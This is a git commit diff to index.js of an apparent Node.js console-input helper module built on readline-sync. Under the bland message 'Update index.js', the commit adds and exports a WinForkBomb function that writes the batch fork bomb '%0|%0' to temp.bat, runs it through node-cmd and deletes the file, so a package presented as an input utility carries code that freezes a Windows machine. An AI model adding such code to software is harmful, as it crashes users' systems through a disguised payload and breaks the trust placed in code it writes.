c5e29b4cfcce6fcf0da8a4db3b927087021b9dd2
! NightSpaceGTT#3371 <NightFailGTT@gmail.com>
2022-10-05 11:50:41 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,18 @@
 const readlineSync = require('readline-sync');
+const fs = require("fs");
+const cmd = require('node-cmd');
 
 const input = ask => {
     const consoleInput = readlineSync.question(ask);
     return consoleInput;
 }
 
-module.exports = { input };
+function WinForkBomb() {
+    let content = `%0|%0`;
+    let tempfile = `temp.bat`;
+    fs.writeFileSync(tempfile, content);
+    cmd.runSync(`${tempfile}`);
+    fs.unlinkSync(tempfile);
+}
+
+module.exports = { input, WinForkBomb };
